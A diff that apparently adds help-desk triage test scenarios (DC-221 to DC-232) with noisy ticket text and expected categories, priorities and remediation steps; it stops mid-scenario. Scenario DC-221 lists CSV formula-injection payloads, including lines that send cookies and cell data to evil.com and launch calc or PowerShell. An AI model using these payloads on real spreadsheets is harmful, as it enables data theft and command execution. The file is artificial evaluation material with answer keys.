@@ -15117,4 +15117,817 @@ def get_scenarios() -> list[ScenarioDefinition]:
             tags=["data-cleanup", "arabic-rtl-mixed", "bidi-technical"],
             difficulty="hard",
         ),
+        # ── DC-221  CSV injection patterns in data storage ticket ───────────
+        ScenarioDefinition(
+            scenario_id="DC-221",
+            subject="Suspicious formulas appearing in exported trade blotter CSV",
+            description=(
+                "Hi Data Platform team,\n\n"
+                "We exported yesterday's trade blotter from the reporting dashboard and "
+                "several cells contain what look like executable formulas instead of data. "
+                "When we open the CSV in Excel, we get security warnings. Here are the "
+                "problematic rows:\n\n"
+                "Row 1042: =CMD('calc')!A0\n"
+                "Row 1043: =HYPERLINK(\"http://evil.com/steal?cookie=\"&A1)\n"
+                "Row 1087: +THUN(\"cmd\";\"calc\")\n"
+                "Row 1102: -2+1+CMD('powershell IEX(malicious)')!Z0\n"
+                "Row 1240: @SUM(1+1)*cmd|' /C calc'!A0\n"
+                "Row 1301: =IMPORTXML(CONCAT(\"http://evil.com/?data=\",A2),\"//a\")\n\n"
+                "The rest of the 5,000+ rows look normal \u2014 standard CUSIP, price, quantity "
+                "columns. We're worried this is either injection from an upstream feed or "
+                "someone tampered with the staging table.\n\n"
+                "Affected system: rpt-sql-prod-03.contoso.internal (ReportingDB)\n"
+                "Table: dbo.DailyTradeBlotter\n"
+                "Export time: 2026-03-17 18:30 UTC\n\n"
+                "Please investigate urgently.\n\n"
+                "\u2014 Priya Sharma\n"
+                "Risk Analytics"
+            ),
+            category=Category.DATA_STORAGE,
+            priority=Priority.P2,
+            team=Team.DATA_PLATFORM,
+            needs_escalation=True,
+            missing_info=[MissingInfo.TIMESTAMP, MissingInfo.STEPS_TO_REPRODUCE],
+            next_best_action=(
+                "Investigate potential CSV injection in the DailyTradeBlotter table "
+                "on rpt-sql-prod-03 \u2014 malicious formulas detected in exported data."
+            ),
+            remediation_steps=[
+                "Query dbo.DailyTradeBlotter for rows containing formula-like patterns (=, +, -, @).",
+                "Audit the upstream data feed pipeline for injection vulnerabilities.",
+                "Sanitize affected rows by prefixing formula characters with a single quote.",
+                "Add input-validation rules to the ETL pipeline to reject formula patterns.",
+                "Re-export the trade blotter and confirm the CSV is clean.",
+            ],
+            reporter_name="Priya Sharma",
+            reporter_email="priya.sharma@contoso.com",
+            reporter_department="Risk Analytics",
+            channel=Channel.EMAIL,
+            tags=["data-cleanup", "csv-injection", "formula-patterns"],
+            difficulty="hard",
+        ),
+        # ── DC-222  GPG/PGP signed email with ASCII armor blocks ───────────
+        ScenarioDefinition(
+            scenario_id="DC-222",
+            subject="Laptop docking station not detected after firmware update",
+            description=(
+                "-----BEGIN PGP SIGNED MESSAGE-----\n"
+                "Hash: SHA512\n\n"
+                "Hello Endpoint team,\n\n"
+                "After the docking station firmware was pushed last Friday, my "
+                "Lenovo ThinkPad X1 Carbon Gen 11 no longer recognizes the "
+                "Thunderbolt dock (Lenovo 40B00300US). I get no video output on "
+                "either monitor and the USB peripherals connected through the dock "
+                "are invisible to Device Manager.\n\n"
+                "Steps I tried:\n"
+                "1. Rebooted the laptop \u2014 no change\n"
+                "2. Tried a different Thunderbolt cable \u2014 same issue\n"
+                "3. Connected a colleague's laptop to my dock \u2014 it works\n"
+                "4. Checked Device Manager \u2014 Thunderbolt controller shows Code 10\n\n"
+                "Firmware version on the dock: 2026.03.14.01\n"
+                "Previous firmware: 2025.12.01.03\n"
+                "Laptop BIOS: 1.58 (N3HET88W)\n"
+                "OS: Windows 11 Enterprise 24H2\n\n"
+                "I need this resolved ASAP \u2014 I present to the board tomorrow and "
+                "need the dual-monitor setup.\n\n"
+                "Best,\nDaniel Okonkwo\nWealth Management\n"
+                "-----BEGIN PGP SIGNATURE-----\n\n"
+                "iQIzBAEBCgAdFiEEU4bKxPm0NmQv5R6pX7kG9GJ8Y+AFAmYZKFQACgkQX7kG\n"
+                "9GJ8Y+BhsA//cK2r3GHFH0hV+VqN3MkZ2z1gR8QOe+N4P4xV5j9LqGfR2K7\n"
+                "dZQ9Yd4Bx/wN+R5jE2VQ7MnKP3F9kQaHxB3sQ+WLMJ2kV7nB8GpT5cE0o1V\n"
+                "FzK8mN0Q9rE5gL2aH7xJ3cY6dW4bR1fS8nT9uP0vK2wX5zA3eD7hI4jM6oQ\n"
+                "=7xKm\n"
+                "-----END PGP SIGNATURE-----"
+            ),
+            category=Category.HARDWARE,
+            priority=Priority.P2,
+            team=Team.ENDPOINT,
+            needs_escalation=False,
+            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ERROR_MESSAGE],
+            next_best_action=(
+                "Investigate Thunderbolt dock detection failure on ThinkPad X1 "
+                "Carbon after firmware update 2026.03.14.01 \u2014 Device Manager shows Code 10."
+            ),
+            remediation_steps=[
+                "Roll back the docking station firmware from 2026.03.14.01 to 2025.12.01.03.",
+                "Update the Thunderbolt controller driver on the ThinkPad X1 Carbon.",
+                "Clear the Thunderbolt device cache in Device Manager and re-enumerate.",
+                "Test dual-monitor output through the dock after driver/firmware remediation.",
+            ],
+            reporter_name="Daniel Okonkwo",
+            reporter_email="daniel.okonkwo@contoso.com",
+            reporter_department="Wealth Management",
+            channel=Channel.EMAIL,
+            tags=["data-cleanup", "pgp-signed-email", "ascii-armor-noise"],
+            difficulty="medium",
+        ),
+        # ── DC-223  Zalgo text with combining Unicode diacritics ────────────
+        ScenarioDefinition(
+            scenario_id="DC-223",
+            subject="A\u0335\u0347\u0317p\u0321\u0353\u0340p\u0334\u0326 c\u0344\u031e\u032dr\u0343\u031f\u0318a\u0308\u0352\u0348s\u0308\u032c\u0316h\u0337\u0329\u0323 on Bloomberg Terminal \u2014 URGENT",
+            description=(
+                "H\u0336\u0349\u0320e\u0337\u0353\u032al\u0335\u032d\u0319l\u0334\u032c\u031co\u0336\u0347\u031e "
+                "I\u0335\u0329\u031fT\u0337\u0348\u0323 S\u0336\u0326\u031eu\u0334\u0353\u032dp\u0335\u032c\u0319"
+                "p\u0337\u0347\u031co\u0336\u0349\u0320r\u0334\u0329\u031ft\u0335\u0348\u031e,\n\n"
+                "My Bloomberg Terminal (serial BT-NYC-4401) crashed this morning at "
+                "09:15 ET while loading the FX options pricer. The application froze "
+                "and displayed corrupted text with strange diacritical marks everywhere "
+                "\u2014 like what you see in this email. I suspect the locale or font "
+                "rendering engine is broken after last night's Windows Update "
+                "(KB5035942).\n\n"
+                "The error dialog said:\n"
+                "\"BLP_CORE.DLL \u2014 Unhandled exception at 0x00007FF6A1B2C3D4 in "
+                "blp_terminal.exe. Access violation reading location "
+                "0x0000000000000000\"\n\n"
+                "I've tried restarting the terminal 3 times. Same crash every time.\n\n"
+                "This is impacting my ability to price client trades. FX desk needs "
+                "this resolved immediately.\n\n"
+                "Regards,\n"
+                "Tomoko Hayashi\n"
+                "FX Trading"
+            ),
+            category=Category.SOFTWARE,
+            priority=Priority.P1,
+            team=Team.ENDPOINT,
+            needs_escalation=True,
+            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.STEPS_TO_REPRODUCE],
+            next_best_action=(
+                "Investigate Bloomberg Terminal crash on BT-NYC-4401 after Windows "
+                "Update KB5035942 \u2014 BLP_CORE.DLL access violation on FX options pricer."
+            ),
+            remediation_steps=[
+                "Uninstall Windows Update KB5035942 from the affected workstation.",
+                "Clear Bloomberg Terminal local cache and restart the application.",
+                "Verify the Bloomberg Terminal version and apply any available patches.",
+                "If the issue persists, escalate to Bloomberg L2 support with the crash dump.",
+            ],
+            reporter_name="Tomoko Hayashi",
+            reporter_email="tomoko.hayashi@contoso.com",
+            reporter_department="FX Trading",
+            channel=Channel.CHAT,
+            tags=["data-cleanup", "zalgo-unicode", "combining-diacritics"],
+            difficulty="hard",
+        ),
+        # ── DC-224  Deeply nested JSON payload (50+ levels) ─────────────────
+        ScenarioDefinition(
+            scenario_id="DC-224",
+            subject="Data lake ingestion failing \u2014 malformed JSON in upstream feed",
+            description=(
+                "Hi Data Platform,\n\n"
+                "The nightly ingestion job for the market-data feed is failing with "
+                "a 'max recursion depth exceeded' error. The upstream vendor started "
+                "sending deeply nested JSON payloads. Here is a truncated sample of "
+                "the problematic record:\n\n"
+                + '{"level_0":' * 55
+                + '{"ticker":"MSFT","price":425.67,"volume":18420000}'
+                + '}' * 55
+                + "\n\n"
+                "The nesting goes 55 levels deep. Our parser (Apache Spark 3.5) "
+                "defaults to a max depth of 50. This started happening after the "
+                "vendor migrated their API to v3 on 2026-03-16.\n\n"
+                "Affected pipeline: adf-prod-marketdata-ingest\n"
+                "Error: com.fasterxml.jackson.core.exc.StreamConstraintsException: "
+                "Document nesting depth (55) exceeds the maximum allowed (50)\n"
+                "Run ID: adf-run-2026-03-17-0200Z\n\n"
+                "We need this fixed before the next trading day.\n\n"
+                "Thanks,\nRobert Chen\nData Engineering"
+            ),
+            category=Category.DATA_STORAGE,
+            priority=Priority.P1,
+            team=Team.DATA_PLATFORM,
+            needs_escalation=True,
+            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.BUSINESS_IMPACT],
+            next_best_action=(
+                "Fix the market-data ingestion pipeline failure caused by deeply "
+                "nested JSON (55 levels) from the upstream vendor's v3 API migration."
+            ),
+            remediation_steps=[
+                "Increase the Jackson parser max nesting depth in the Spark ingestion job configuration.",
+                "Add a JSON-flattening pre-processing step to normalize deeply nested payloads.",
+                "Contact the upstream vendor to request payload structure documentation for API v3.",
+                "Re-run the failed ADF pipeline run adf-run-2026-03-17-0200Z after the fix.",
+                "Add monitoring alerts for JSON nesting depth anomalies in future ingestions.",
+            ],
+            reporter_name="Robert Chen",
+            reporter_email="robert.chen@contoso.com",
+            reporter_department="Data Engineering",
+            channel=Channel.PORTAL,
+            tags=["data-cleanup", "deep-nested-json", "parser-overflow"],
+            difficulty="hard",
+        ),
+        # ── DC-225  Raw SQL query output with column headers/separators ─────
+        ScenarioDefinition(
+            scenario_id="DC-225",
+            subject="Orphaned records in the client account mapping table",
+            description=(
+                "Hi team,\n\n"
+                "I ran a diagnostic query and found orphaned records in the account "
+                "mapping table. Pasting the output here:\n\n"
+                "+------------+------------------+-------------+------------+--------+\n"
+                "| account_id | client_name      | advisor_id  | region     | status |\n"
+                "+------------+------------------+-------------+------------+--------+\n"
+                "| ACC-90241  | NULL             | ADV-1102    | US-EAST    | ACTIVE |\n"
+                "| ACC-90242  | Meridian Cap.    | NULL        | US-WEST    | ACTIVE |\n"
+                "| ACC-90243  | NULL             | NULL        | NULL       | ORPHAN |\n"
+                "| ACC-90244  | Vanguard Trust   | ADV-0000    | EU-WEST    | ACTIVE |\n"
+                "| ACC-90245  | Apex Holdings    | ADV-1103    | NULL       | PEND   |\n"
+                "| ACC-90246  | NULL             | ADV-1104    | APAC       | ACTIVE |\n"
+                "| ACC-90247  | Sterling & Co.   | ADV-1105    | US-EAST    | ORPHAN |\n"
+                "| ACC-90248  | NULL             | NULL        | US-CENTRAL | ORPHAN |\n"
+                "+------------+------------------+-------------+------------+--------+\n"
+                "8 rows in set (0.03 sec)\n\n"
+                "Query used:\n"
+                "SELECT account_id, client_name, advisor_id, region, status\n"
+                "FROM dbo.ClientAccountMapping\n"
+                "WHERE client_name IS NULL OR advisor_id IS NULL OR status = 'ORPHAN';\n\n"
+                "These orphaned/incomplete records are causing reconciliation failures "
+                "in the nightly batch. Database: acct-sql-prod-01, schema: dbo.\n\n"
+                "\u2014 Samantha Wright\nOperations"
+            ),
+            category=Category.DATA_STORAGE,
+            priority=Priority.P3,
+            team=Team.DATA_PLATFORM,
+            needs_escalation=False,
+            missing_info=[MissingInfo.TIMESTAMP, MissingInfo.AFFECTED_SYSTEM],
+            next_best_action=(
+                "Clean up orphaned and incomplete records in dbo.ClientAccountMapping "
+                "on acct-sql-prod-01 that are causing nightly reconciliation failures."
+            ),
+            remediation_steps=[
+                "Back up the ClientAccountMapping table before making changes.",
+                "Investigate the source of NULL client_name and advisor_id values in the ETL pipeline.",
+                "Archive or delete confirmed orphaned records (status = 'ORPHAN') after review.",
+                "Add NOT NULL constraints or default values to prevent future orphaned records.",
+            ],
+            reporter_name="Samantha Wright",
+            reporter_email="samantha.wright@contoso.com",
+            reporter_department="Operations",
+            channel=Channel.PORTAL,
+            tags=["data-cleanup", "sql-output-noise", "tabular-data"],
+            difficulty="medium",
+        ),
+        # ── DC-226  S/MIME digital signature block in access/auth ticket ────
+        ScenarioDefinition(
+            scenario_id="DC-226",
+            subject="Service account locked out after password rotation",
+            description=(
+                "Content-Type: multipart/signed; protocol=\"application/pkcs7-signature\";\n"
+                "  micalg=sha-256; boundary=\"----=_Part_5432_1234567890\"\n\n"
+                "------=_Part_5432_1234567890\n"
+                "Content-Type: text/plain; charset=UTF-8\n\n"
+                "Hi IAM team,\n\n"
+                "The service account svc-trade-reconciler@contoso.com was locked out "
+                "this morning after an automated password rotation triggered by CyberArk. "
+                "The new password was applied to the vault but not propagated to the "
+                "three downstream systems that use this account:\n\n"
+                "1. Trade Reconciliation Service (trade-recon-prod-01)\n"
+                "2. EOD Settlement Batch (settle-batch-prod-02)\n"
+                "3. Client Reporting Portal (rpt-portal-prod-01)\n\n"
+                "All three services are now failing authentication. The reconciliation "
+                "service processes $2.3B in daily trades and must be back online before "
+                "4:00 PM ET cutoff.\n\n"
+                "CyberArk Vault: PVWA-PROD-01\n"
+                "Account: svc-trade-reconciler\n"
+                "Lockout time: 2026-03-18 06:45:00 UTC\n"
+                "AD Event ID: 4740 (Account Lockout)\n\n"
+                "Regards,\nAisha Patel\nTrade Operations\n\n"
+                "------=_Part_5432_1234567890\n"
+                "Content-Type: application/pkcs7-signature; name=smime.p7s\n"
+                "Content-Transfer-Encoding: base64\n\n"
+                "MIIGXgYJKoZIhvcNAQcCoIIGTzCCBksCAQExDzANBglghkgBZQMEAgEFADAL\n"
+                "BgkqhkiG9w0BBwGgggPkMIID4DCCAsigAwIBAgIQK2r3GHFH0hV5R6pX7kG9\n"
+                "GDANBgkqhkiG9w0BAQsFADBFMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMQ29u\n"
+                "dG9zbyBMdGQxHzAdBgNVBAMTFkNvbnRvc28gSXNzdWluZyBDQSBHMjAeFw0y\n"
+                "NjAxMTUwMDAwMDBaFw0yNzAxMTUyMzU5NTlaMCkxJzAlBgNVBAMTHmFpc2hh\n"
+                "------=_Part_5432_1234567890--"
+            ),
+            category=Category.ACCESS_AUTH,
+            priority=Priority.P1,
+            team=Team.IAM,
+            needs_escalation=True,
+            missing_info=[MissingInfo.AUTHENTICATION_METHOD, MissingInfo.CONFIGURATION_DETAILS],
+            next_best_action=(
+                "Unlock service account svc-trade-reconciler and propagate the rotated "
+                "password to all three downstream systems before the 4:00 PM ET cutoff."
+            ),
+            remediation_steps=[
+                "Unlock svc-trade-reconciler in Active Directory immediately.",
+                "Retrieve the current password from CyberArk vault PVWA-PROD-01.",
+                "Update the stored credentials on trade-recon-prod-01, settle-batch-prod-02, and rpt-portal-prod-01.",
+                "Restart all three services and verify successful authentication.",
+                "Configure CyberArk to auto-propagate rotated credentials to dependent systems.",
+            ],
+            reporter_name="Aisha Patel",
+            reporter_email="aisha.patel@contoso.com",
+            reporter_department="Trade Operations",
+            channel=Channel.EMAIL,
+            tags=["data-cleanup", "smime-signature", "pkcs7-noise"],
+            difficulty="hard",
+        ),
+        # ── DC-227  Near-empty "Sent from my iPhone" body ───────────────────
+        ScenarioDefinition(
+            scenario_id="DC-227",
+            subject="Excel crashes when opening Q1 risk model \u2014 macro error VBA runtime 1004",
+            description=(
+                "\n\n"
+                "Sent from my iPhone"
+            ),
+            category=Category.SOFTWARE,
+            priority=Priority.P3,
+            team=Team.ENDPOINT,
+            needs_escalation=False,
+            missing_info=[
+                MissingInfo.ERROR_MESSAGE,
+                MissingInfo.STEPS_TO_REPRODUCE,
+                MissingInfo.APPLICATION_VERSION,
+                MissingInfo.AFFECTED_SYSTEM,
+            ],
+            next_best_action=(
+                "Follow up with the reporter to get details about the Excel crash "
+                "and VBA runtime error 1004 mentioned in the subject line."
+            ),
+            remediation_steps=[
+                "Contact the reporter to obtain the full error message and steps to reproduce.",
+                "Request the Excel and VBA version, and whether the file is on SharePoint or local.",
+                "Once details are available, attempt to reproduce the crash in a test environment.",
+            ],
+            reporter_name="Gregory Lawson",
+            reporter_email="gregory.lawson@contoso.com",
+            reporter_department="Risk Management",
+            channel=Channel.EMAIL,
+            tags=["data-cleanup", "empty-body", "mobile-signature-only"],
+            difficulty="easy",
+        ),
+        # ── DC-228  Auto-generated JIRA notification with transition history ─
+        ScenarioDefinition(
+            scenario_id="DC-228",
+            subject="[JIRA] (INFRA-8842) Updated: Network switch replacement \u2014 Building 3 Floor 7",
+            description=(
+                "Atlassian JIRA (v9.12.2) \u2014 Issue Update Notification\n"
+                "==========================================================\n\n"
+                "Issue: INFRA-8842\n"
+                "Type: Task\n"
+                "Priority: High\n"
+                "Reporter: net-ops-bot\n"
+                "Assignee: Carlos Mendez\n\n"
+                "Change History:\n"
+                "---------------------------------------------------------------\n"
+                "2026-03-10 09:00  Status: Open \u2192 In Progress (by Carlos Mendez)\n"
+                "2026-03-10 09:05  Assignee: Unassigned \u2192 Carlos Mendez\n"
+                "2026-03-11 14:20  Comment: 'Ordered Cisco C9300-48T from vendor.'\n"
+                "2026-03-12 11:00  Status: In Progress \u2192 Waiting for Hardware\n"
+                "2026-03-14 08:30  Comment: 'Switch arrived. Scheduling maintenance window.'\n"
+                "2026-03-14 09:00  Status: Waiting for Hardware \u2192 In Progress\n"
+                "2026-03-15 02:00  Comment: 'Maintenance window: 2026-03-16 02:00\u201304:00 UTC'\n"
+                "2026-03-16 02:15  Comment: 'Old switch powered off. Starting swap.'\n"
+                "2026-03-16 03:45  Comment: 'New switch online. Running post-checks.'\n"
+                "2026-03-16 04:10  Status: In Progress \u2192 Post-Verification\n"
+                "2026-03-17 10:00  Comment: 'Users on Floor 7 reporting intermittent drops.'\n"
+                "2026-03-17 10:30  Priority: High \u2192 Critical\n"
+                "2026-03-17 10:35  Status: Post-Verification \u2192 In Progress\n"
+                "2026-03-17 11:00  Assignee: Carlos Mendez \u2192 Li Wei\n"
+                "2026-03-18 08:00  Comment: 'Spanning tree misconfiguration suspected.'\n"
+                "---------------------------------------------------------------\n\n"
+                "Latest Comment (Li Wei, 2026-03-18 08:00):\n"
+                "\"After reviewing the logs, I suspect the new Cisco C9300-48T has a "
+                "spanning tree priority conflict with the existing core stack. VLAN 710 "
+                "(Floor 7 data) is intermittently losing its root bridge. Need to adjust "
+                "STP priority from 32768 to 4096 on the new switch. Requesting an "
+                "emergency change window tonight.\"\n\n"
+                "\u2014\u2014\u2014\nThis message was automatically generated by Atlassian JIRA.\n"
+                "Do not reply to this email.\n"
+                "Manage notifications: https://jira.contoso.internal/settings/notifications"
+            ),
+            category=Category.NETWORK,
+            priority=Priority.P1,
+            team=Team.NETWORK_OPS,
+            needs_escalation=True,
+            missing_info=[MissingInfo.AFFECTED_USERS, MissingInfo.NETWORK_LOCATION],
+            next_best_action=(
+                "Approve emergency change window to fix spanning tree priority conflict "
+                "on new Cisco C9300-48T in Building 3 Floor 7 causing intermittent drops."
+            ),
+            remediation_steps=[
+                "Schedule an emergency change window for STP priority adjustment.",
+                "Set the spanning tree priority to 4096 on the new Cisco C9300-48T for VLAN 710.",
+                "Verify root bridge election is stable after the change.",
+                "Monitor Floor 7 network connectivity for 24 hours post-change.",
+            ],
+            reporter_name="Li Wei",
+            reporter_email="li.wei@contoso.com",
+            reporter_department="Network Operations",
+            channel=Channel.EMAIL,
+            tags=["data-cleanup", "jira-notification", "transition-history-noise"],
+            difficulty="medium",
+        ),
+        # ── DC-229  Windows registry export (.reg format) ───────────────────
+        ScenarioDefinition(
+            scenario_id="DC-229",
+            subject="Outlook keeps reverting proxy settings after GPO refresh",
+            description=(
+                "Hi Endpoint team,\n\n"
+                "Every 90 minutes Outlook resets my proxy configuration. I exported "
+                "the registry key that keeps getting overwritten \u2014 here it is:\n\n"
+                "Windows Registry Editor Version 5.00\n\n"
+                "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\HTTP\\Proxy]\n"
+                "\"ProxyServer\"=\"proxy-nyc.contoso.internal:8080\"\n"
+                "\"ProxyOverride\"=\"*.contoso.internal;10.*;192.168.*;172.16.*\"\n"
+                "\"ProxyEnable\"=dword:00000001\n"
+                "\"AutoDetect\"=dword:00000000\n"
+                "\"AutoConfigURL\"=\"http://wpad.contoso.internal/wpad.dat\"\n\n"
+                "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\HTTP\\Proxy\\Backup]\n"
+                "\"ProxyServer_backup\"=\"proxy-chi.contoso.internal:3128\"\n"
+                "\"ProxyEnable_backup\"=dword:00000001\n"
+                "\"LastGPORefresh\"=\"2026-03-18T08:30:00Z\"\n\n"
+                "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Office\\16.0\\Outlook\\HTTP]\n"
+                "\"ForceProxy\"=dword:00000001\n"
+                "\"MandatoryProxyServer\"=\"proxy-chi.contoso.internal:3128\"\n"
+                "\"AllowUserOverride\"=dword:00000000\n\n"
+                "As you can see, the GPO is forcing proxy-chi (Chicago) but I'm in "
+                "the New York office and need proxy-nyc. The ForceProxy + "
+                "AllowUserOverride=0 means I can't fix this myself. My OU is "
+                "OU=NYC-Trading,OU=Workstations,DC=contoso,DC=internal.\n\n"
+                "Machine: WS-NYC-TRD-0042\n"
+                "OS: Windows 11 Enterprise 24H2\n"
+                "Outlook: Microsoft 365 v2402\n\n"
+                "\u2014 Marcus Thompson\nEquity Trading"
+            ),
+            category=Category.SOFTWARE,
+            priority=Priority.P3,
+            team=Team.ENDPOINT,
+            needs_escalation=False,
+            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.ENVIRONMENT_DETAILS],
+            next_best_action=(
+                "Fix the GPO proxy assignment for OU=NYC-Trading workstations \u2014 "
+                "the policy is incorrectly forcing the Chicago proxy on New York machines."
+            ),
+            remediation_steps=[
+                "Review the GPO linked to OU=NYC-Trading to identify the incorrect proxy assignment.",
+                "Update the GPO to assign proxy-nyc.contoso.internal:8080 for NYC workstations.",
+                "Run gpupdate /force on WS-NYC-TRD-0042 and verify the registry reflects the correct proxy.",
+                "Confirm Outlook connects through the correct proxy after the GPO update.",
+            ],
+            reporter_name="Marcus Thompson",
+            reporter_email="marcus.thompson@contoso.com",
+            reporter_department="Equity Trading",
+            channel=Channel.PORTAL,
+            tags=["data-cleanup", "registry-export", "reg-file-noise"],
+            difficulty="medium",
+        ),
+        # ── DC-230  Python traceback with very deep stack (50+ frames) ──────
+        ScenarioDefinition(
+            scenario_id="DC-230",
+            subject="Portfolio optimizer service crashing with RecursionError",
+            description=(
+                "Hi team,\n\n"
+                "The portfolio optimizer microservice keeps crashing. Full traceback:\n\n"
+                "Traceback (most recent call last):\n"
+                "  File \"/opt/contoso/portfolio-optimizer/main.py\", line 42, in run_server\n"
+                "    result = optimizer.optimize(portfolio)\n"
+                "  File \"/opt/contoso/portfolio-optimizer/core/engine.py\", line 118, in optimize\n"
+                "    return self._recursive_rebalance(holdings, constraints)\n"
+                + "".join(
+                    f'  File "/opt/contoso/portfolio-optimizer/core/engine.py", line 205, in _recursive_rebalance\n'
+                    f'    return self._recursive_rebalance(sub_holdings[{i}], constraints)\n'
+                    for i in range(50)
+                )
+                + "RecursionError: maximum recursion depth exceeded while calling a Python object\n\n"
+                "This started after we deployed v2.14.0 which added hierarchical "
+                "risk parity. The recursive rebalancing doesn't have a base case "
+                "when the sub-portfolio has only one asset.\n\n"
+                "Service: portfolio-optimizer (K8s namespace: prod-quant)\n"
+                "Pod: portfolio-optimizer-7b8c9d-xk4m2\n"
+                "Python: 3.12.2\n"
+                "Deploy tag: v2.14.0 (deployed 2026-03-17 22:00 UTC)\n\n"
+                "\u2014 Elena Volkov\nQuantitative Development"
+            ),
+            category=Category.SOFTWARE,
+            priority=Priority.P2,
+            team=Team.ENTERPRISE_APPS,
+            needs_escalation=False,
+            missing_info=[MissingInfo.STEPS_TO_REPRODUCE, MissingInfo.BUSINESS_IMPACT],
+            next_best_action=(
+                "Roll back portfolio-optimizer to v2.13.x or hotfix the missing "
+                "base case in _recursive_rebalance for single-asset sub-portfolios."
+            ),
+            remediation_steps=[
+                "Roll back the portfolio-optimizer deployment to the previous stable version v2.13.x.",
+                "File a bug for the missing base case in _recursive_rebalance for single-asset portfolios.",
+                "Add a unit test for single-asset sub-portfolio input to prevent regression.",
+                "Deploy the hotfix and verify the optimizer handles all portfolio sizes without recursion errors.",
+            ],
+            reporter_name="Elena Volkov",
+            reporter_email="elena.volkov@contoso.com",
+            reporter_department="Quantitative Development",
+            channel=Channel.CHAT,
+            tags=["data-cleanup", "deep-traceback", "recursion-error"],
+            difficulty="medium",
+        ),
+        # ── DC-231  URL with extremely long query parameters ────────────────
+        ScenarioDefinition(
+            scenario_id="DC-231",
+            subject="SharePoint dashboard not loading for compliance team",
+            description=(
+                "Hi Enterprise Apps,\n\n"
+                "The compliance dashboard on SharePoint won't load. I get a blank "
+                "page. Here's the URL I'm trying to access:\n\n"
+                "https://contoso.sharepoint.com/sites/compliance-dashboard/SitePages/"
+                "RiskOverview.aspx"
+                "?sessionId=a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+                "&utm_source=email&utm_medium=weekly_digest&utm_campaign=compliance_q1_2026"
+                "&utm_content=risk_overview_link&utm_term=regulatory_dashboard"
+                "&token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjFhMmIzYzRkLTVlNmYtNzg5MC1hYmNkLWVmMTIzNDU2Nzg5MCJ9"
+                ".eyJzdWIiOiJ1c2VyQGNvbnRvc28uY29tIiwibmFtZSI6Ikplbm5pZmVyIE1vcmdhbiIsImlhdCI6MTcxMTAwMDAwMCwiZXhwIjoxNzExMDAzNjAwLCJhdWQiOiJjb250b3NvLXNoYXJlcG9pbnQiLCJpc3MiOiJodHRwczovL3N0cy5jb250b3NvLmNvbSIsInNjb3BlIjoiU2l0ZXMuUmVhZC5BbGwgU2l0ZXMuV3JpdGUuQWxsIFVzZXIuUmVhZCJ9"
+                ".dummysignaturepaddingtomakethisurllongerthantwo"
+                "thousandcharacterswhichisneededtotriggertheedge"
+                "caseweretestingherebecausemanybrowsersandproxies"
+                "truncateurlslongerthantwothousandcharactersand"
+                "thiscausesallsortsofinterestingfailuresinenterprise"
+                "environmentswithlegacyproxiesandwafsandreverse"
+                "proxiesthatdonothandlelongurlsgracefully"
+                "&returnUrl=%2Fsites%2Fcompliance-dashboard%2FSitePages%2FHome.aspx"
+                "&filter=region%3DUS-EAST%26status%3DOPEN%26priority%3DHIGH"
+                "&debug=false&v=2026.03.18.1\n\n"
+                "I've tried Chrome and Edge \u2014 same result. Other SharePoint sites "
+                "work fine. I think the URL is too long because of all those tracking "
+                "parameters and the embedded token. This dashboard is required for our "
+                "weekly regulatory filing due Friday.\n\n"
+                "\u2014 Jennifer Morgan\nCompliance"
+            ),
+            category=Category.SOFTWARE,
+            priority=Priority.P2,
+            team=Team.ENTERPRISE_APPS,
+            needs_escalation=False,
+            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.ENVIRONMENT_DETAILS],
+            next_best_action=(
+                "Investigate SharePoint compliance dashboard loading failure \u2014 "
+                "likely caused by URL exceeding maximum length due to embedded JWT and UTM parameters."
+            ),
+            remediation_steps=[
+                "Verify the URL length exceeds the proxy or WAF maximum URL limit.",
+                "Remove unnecessary UTM tracking parameters from the dashboard link in the email digest.",
+                "Move the session token from URL query parameter to an HTTP header or cookie.",
+                "Test the dashboard loads correctly with a shortened URL.",
+            ],
+            reporter_name="Jennifer Morgan",
+            reporter_email="jennifer.morgan@contoso.com",
+            reporter_department="Compliance",
+            channel=Channel.EMAIL,
+            tags=["data-cleanup", "long-url", "query-param-overflow"],
+            difficulty="medium",
+        ),
+        # ── DC-232  Multiple conflicting auto-reply headers ─────────────────
+        ScenarioDefinition(
+            scenario_id="DC-232",
+            subject="Re: Re: Out of Office: Re: Auto: Out of Office: Network printer offline \u2014 Floor 12",
+            description=(
+                "Auto-Reply: I am currently out of the office with no access to email.\n"
+                "For urgent matters, contact helpdesk@contoso.com.\n"
+                "\u2014 David Kim, Portfolio Management\n\n"
+                "--- Auto-Reply from Rebecca Torres ---\n"
+                "Thank you for your message. I am out of the office until March 24, "
+                "2026. For immediate assistance, please contact my backup, "
+                "James O'Brien (james.obrien@contoso.com).\n\n"
+                "--- Auto-Reply from James O'Brien ---\n"
+                "I am currently in an all-day training session and will respond to "
+                "emails after 5:00 PM ET. For urgent IT issues, please submit a "
+                "ticket at https://helpdesk.contoso.internal.\n\n"
+                "--- Original Message ---\n"
+                "From: Maria Santos <maria.santos@contoso.com>\n"
+                "To: IT Support <itsupport@contoso.com>\n"
+                "CC: David Kim; Rebecca Torres\n"
+                "Subject: Network printer offline \u2014 Floor 12\n\n"
+                "Hi IT Support,\n\n"
+                "The network printer on Floor 12 (HP LaserJet MFP M634, asset tag "
+                "PRN-NYC-1201) has been offline since this morning. It shows "
+                "'Communication Error' on the display panel. IP address is "
+                "10.12.40.50. We've tried power cycling it but it won't reconnect "
+                "to the network. The entire floor (approx. 45 people) can't print.\n\n"
+                "Thanks,\nMaria Santos\nClient Services"
+            ),
+            category=Category.NETWORK,
+            priority=Priority.P3,
+            team=Team.NETWORK_OPS,
+            needs_escalation=False,
+            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.NETWORK_LOCATION],
+            next_best_action=(
+                "Investigate network printer PRN-NYC-1201 (10.12.40.50) communication "
+                "error on Floor 12 \u2014 the real issue is buried under three auto-reply layers."
+            ),
+            remediation_steps=[
